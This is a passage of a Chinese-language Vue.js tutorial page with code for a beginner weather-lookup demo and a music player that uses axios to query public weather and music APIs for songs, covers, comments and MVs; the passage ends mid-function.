<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/axios/0.21.1/axios.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrap&quot;</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;search_form&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>天知道<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form_group&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;searchWeather&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;city&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">&quot;input_txt&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入查询的天气&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;input_sub&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;searchWeather&quot;</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hotkey&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeCity(&#x27;北京&#x27;)&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeCity(&#x27;上海&#x27;)&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeCity(&#x27;广州&#x27;)&quot;</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeCity(&#x27;深圳&#x27;)&quot;</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;weather_list&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in weatherList&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info_type&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;iconfont&quot;</span>&gt;</span>&#123;&#123;item.type&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info_temp&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123;item.low&#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">                ~</span><br><span class="line">                <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123;item.high&#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info_date&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.date &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    data:&#123;</span><br><span class="line">        city:<span class="string">&quot;&quot;</span>,</span><br><span class="line">        weatherList:[]</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        searchWeather:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// var that = this;</span></span><br><span class="line">            axios.get(<span class="string">&quot;http://wthrcdn.etouch.cn/weather_mini?city=&quot;</span>+<span class="built_in">this</span>.city)</span><br><span class="line">            .then(<span class="function">(<span class="params">response</span>)=&gt;</span>&#123;</span><br><span class="line">                <span class="comment">// console.log(response.data.data.forecast);</span></span><br><span class="line">                <span class="built_in">this</span>.weatherList = response.data.data.forecast;</span><br><span class="line">            &#125;,<span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        changeCity:<span class="function"><span class="keyword">function</span> (<span class="params">city</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.city = city;</span><br><span class="line">            <span class="built_in">this</span>.searchWeather();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


<h2 id="四、综合应用（播放器）"><a href="#四、综合应用（播放器）" class="headerlink" title="四、综合应用（播放器）"></a>四、综合应用（播放器）</h2><h3 id="4-1-歌曲搜索"><a href="#4-1-歌曲搜索" class="headerlink" title="4.1 歌曲搜索"></a>4.1 歌曲搜索</h3><ol>
<li>按下回车（v-on.enter）</li>
<li>查询数据（axios 接口 v-model）</li>
<li>渲染数据（v-for 数组 that 或使用箭头函数）</li>
</ol>
<ul>
<li>服务器返回的数据比较复杂时，获取的时候需要注意层级结构</li>
<li>通过审查元素快速定位到需要操纵的元素</li>
</ul>
<h3 id="4-2-歌曲播放"><a href="#4-2-歌曲播放" class="headerlink" title="4.2 歌曲播放"></a>4.2 歌曲播放</h3><ol>
<li>点击播放（v-on 自定义参数）</li>
<li>歌曲地址获取（接口 歌曲id）</li>
<li>歌曲地址设置（v-bind）</li>
</ol>
<ul>
<li>歌曲id依赖歌曲搜索的结果，对于不用的数据也需要关注</li>
</ul>
<h3 id="4-3-歌曲封面"><a href="#4-3-歌曲封面" class="headerlink" title="4.3 歌曲封面"></a>4.3 歌曲封面</h3><ol>
<li>点击播放（增加逻辑）</li>
<li>歌曲封面获取（接口 歌曲id）</li>
<li>歌曲封面设置（v-bind）</li>
</ol>
<ul>
<li>在vue中通过 v-bind 操纵元素</li>
<li>本地无法获取的数据，基本都会有对应的接口</li>
</ul>
<h4 id="4-4-歌曲评论"><a href="#4-4-歌曲评论" class="headerlink" title="4.4 歌曲评论"></a>4.4 歌曲评论</h4><ol>
<li>点击播放（增加逻辑）</li>
<li>歌曲评论获取（接口 歌曲id）</li>
<li>歌曲评论渲染</li>
</ol>
<ul>
<li>在 vue中通过 v-for 生成列表</li>
</ul>
<h3 id="4-5-播放动画"><a href="#4-5-播放动画" class="headerlink" title="4.5 播放动画"></a>4.5 播放动画</h3><ol>
<li>监听音乐播放（v-on play）</li>
<li>监听音乐暂停（v-on pause）</li>
<li>操纵类名（v-bind 对象）</li>
</ol>
<ul>
<li>audio 标签的 play 事件会在音频播放的时候触发</li>
<li>audio 标签的 pause 事件会在音频暂停的时候触发</li>
<li>通过对象的方式设置类名，类名生效与否取决于后面值得真假</li>
</ul>
<h3 id="4-6-mv播放"><a href="#4-6-mv播放" class="headerlink" title="4.6 mv播放"></a>4.6 mv播放</h3><ol>
<li>mv图标显示（v-if）</li>
<li>mv地址获取（接口 mvid）</li>
<li>遮罩层（v-show v-on）</li>
<li>mv地址设置（v-bind）</li>
</ol>
<h3 id="4-7-综合应用重点"><a href="#4-7-综合应用重点" class="headerlink" title="4.7 综合应用重点"></a>4.7 综合应用重点</h3><ul>
<li>不同接口需要得数据是不同的</li>
<li>页面结构复杂之后，通过审查元素的方式取快速定位相关元素</li>
<li>响应式的数据都需要在 data 中定义</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>悦听player<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 样式 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/index.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 播放器主体区域 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;play_wrap&quot;</span> <span class="attr">id</span>=<span class="string">&quot;player&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;search_bar&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/player_title.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 搜索歌曲 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;query&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;searchMusic&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center_con&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 搜索歌曲列表 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;song_wrapper&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;song_list&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in musicList&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;playMusic(item.id)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">&quot;item.mvid !== 0&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;playMV(item.mvid)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/line.png&quot;</span> <span class="attr">class</span>=<span class="string">&quot;switch_btn&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 歌曲信息容器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;player_con&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;playing:isPlaying&#125;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/player_bar.png&quot;</span> <span class="attr">class</span>=<span class="string">&quot;play_bar&quot;</span> /&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- 黑胶碟片 --&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/disc.png&quot;</span> <span class="attr">class</span>=<span class="string">&quot;disc autoRotate&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;musicCover&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cover autoRotate&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 评论容器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;comment_wrapper&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h5</span> <span class="attr">class</span>=<span class="string">&#x27;title&#x27;</span>&gt;</span>热门留言<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;comment_list&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dl</span> <span class="attr">v-for</span>=<span class="string">&quot;item in hotComments&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dt</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;item.user.avatarUrl&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dd</span> <span class="attr">class</span>=<span class="string">&quot;name&quot;</span>&gt;</span>&#123;&#123;item.user.nickname&#125;&#125;<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dd</span> <span class="attr">class</span>=<span class="string">&quot;detail&quot;</span>&gt;</span></span><br><span class="line">                  &#123;&#123;item.content&#125;&#125;</span><br><span class="line">              <span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/line.png&quot;</span> <span class="attr">class</span>=<span class="string">&quot;right_line&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;audio_con&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">audio</span> <span class="attr">ref</span>=<span class="string">&#x27;audio&#x27;</span> @<span class="attr">play</span>=<span class="string">&quot;play&quot;</span> @<span class="attr">pause</span>=<span class="string">&quot;pause&quot;</span> <span class="attr">:src</span>=<span class="string">&quot;musicUrl&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">controls</span> <span class="attr">autoplay</span> <span class="attr">loop</span> <span class="attr">class</span>=<span class="string">&quot;myaudio&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;video_con&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">video</span> <span class="attr">:src</span>=<span class="string">&quot;mvUrl&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mask&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;hide&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 官网提供的 axios 在线地址 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/axios/dist/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  1:歌曲搜索接口</span></span><br><span class="line"><span class="comment">    请求地址:https://autumnfish.cn/search</span></span><br><span class="line"><span class="comment">    请求方法:get</span></span><br><span class="line"><span class="comment">    请求参数:keywords(查询关键字)</span></span><br><span class="line"><span class="comment">    响应内容:歌曲搜索结果</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  2:歌曲url获取接口</span></span><br><span class="line"><span class="comment">    请求地址:https://autumnfish.cn/song/url</span></span><br><span class="line"><span class="comment">    请求方法:get</span></span><br><span class="line"><span class="comment">    请求参数:id(歌曲id)</span></span><br><span class="line"><span class="comment">    响应内容:歌曲url地址</span></span><br><span class="line"><span class="comment">  3.歌曲详情获取</span></span><br><span class="line"><span class="comment">    请求地址:https://autumnfish.cn/song/detail</span></span><br><span class="line"><span class="comment">    请求方法:get</span></span><br><span class="line"><span class="comment">    请求参数:ids(歌曲id)</span></span><br><span class="line"><span class="comment">    响应内容:歌曲详情(包括封面信息)</span></span><br><span class="line"><span class="comment">  4.热门评论获取</span></span><br><span class="line"><span class="comment">    请求地址:https://autumnfish.cn/comment/hot?type=0</span></span><br><span class="line"><span class="comment">    请求方法:get</span></span><br><span class="line"><span class="comment">    请求参数:id(歌曲id,地址中的type固定为0)</span></span><br><span class="line"><span class="comment">    响应内容:歌曲的热门评论</span></span><br><span class="line"><span class="comment">  5.mv地址获取</span></span><br><span class="line"><span class="comment">    请求地址:https://autumnfish.cn/mv/url</span></span><br><span class="line"><span class="comment">    请求方法:get</span></span><br><span class="line"><span class="comment">    请求参数:id(mvid,为0表示没有mv)</span></span><br><span class="line"><span class="comment">    响应内容:mv的地址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">&quot;#player&quot;</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    <span class="comment">// 查询关键字</span></span><br><span class="line">    query: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="comment">// 歌曲数组</span></span><br><span class="line">    musicList: [],</span><br><span class="line">    <span class="comment">// 歌曲地址</span></span><br><span class="line">    musicUrl: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="comment">// 歌曲封面</span></span><br><span class="line">    musicCover: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="comment">// 歌曲评论</span></span><br><span class="line">    hotComments: [],</span><br><span class="line">    <span class="comment">// 动画播放状态</span></span><br><span class="line">    isPlaying: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 遮罩层的显示状态</span></span><br><span class="line">    isShow: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// mv地址</span></span><br><span class="line">    mvUrl: <span class="string">&quot;&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    <span class="comment">// 歌曲搜索</span></span><br><span class="line">    searchMusic: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">      axios.get(<span class="string">&quot;https://autumnfish.cn/search?keywords=&quot;</span> + <span class="built_in">this</span>.query).then(</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">          <span class="comment">// console.log(response);</span></span><br><span class="line">          that.musicList = response.data.result.songs;</span><br><span class="line">          <span class="comment">// console.log(response.data.result.songs);</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;&#125;</span><br><span class="line">      );</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 歌曲播放</span></span><br><span class="line">    playMusic: <span class="function"><span class="keyword">function</span>(<span class="params">musicId</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//   console.log(musicId);</span></span><br><span class="line">      <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">      <span class="comment">// 获取歌曲地址</span></span><br><span class="line">      axios.get(<span class="string">&quot;https://autumnfish.cn/song/url?id=&quot;</span> + musicId).then(</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">          <span class="comment">// console.log(response);</span></span><br><span class="line">          <span class="comment">// console.log(response.data.data[0].url);</span></span><br><span class="line">          that.musicUrl = response.data.data[<span class="number">0</span>].url;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;&#125;</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 歌曲详情获取</span></span><br><span class="line">      axios.get(<span class="string">&quot;https://autumnfish.cn/song/detail?ids=&quot;</span> + musicId).then(</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">          <span class="comment">// console.log(response);</span></span><br><span class="line">          <span class="comment">// console.log(response.data.songs[0].al.picUrl);</span></span><br><span class="line">          that.musicCover = response.data.songs[<span class="number">0</span>].al.picUrl;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;&#125;</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 歌曲评论获取</span></span><br><span class="line">      axios.get(<span class="string">&quot;https://autumnfish.cn/comment/hot?type=0&amp;id=&quot;</span> + musicId).then(</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">          <span class="comment">// console.log(response);</span></span><br><span class="line">          <span class="comment">// console.log(response.data.hotComments);</span></span><br><span class="line">          that.hotComments = response.data.hotComments;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;&#125;</span><br><span class="line">      );</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 歌曲播放</span></span><br><span class="line">    play: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="comment">// console.log(&quot;play&quot;);</span></span><br><span class="line">      <span class="built_in">this</span>.isPlaying = <span class="literal">true</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 歌曲暂停</span></span><br><span class="line">    pause: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="comment">// console.log(&quot;pause&quot;);</span></span><br><span class="line">      <span class="built_in">this</span>.isPlaying = <span class="literal">false</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 播放mv</span></span><br><span class="line">    playMV: <span class="function"><span class="keyword">function</span>(<span class="params">mvid</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">      axios.get(<span class="string">&quot;https://autumnfish.cn/mv/url?id=&quot;</span> + mvid).then(</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">          <span class="comment">// console.log(response);</span></span><br><span class="line">          <span class="comment">// console.log(response.data.data.url);</span></span><br><span class="line">          that.isShow = <span class="literal">true</span>;</span><br><span class="line">          that.mvUrl = response.data.data.url;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;&#125;</span><br><span class="line">      );</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 隐藏</span></span><br><span class="line">    hide: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.isShow = <span class="literal">false</span>;</span><br><span class="line">      <span class="built_in">this</span>.mvUrl = <span 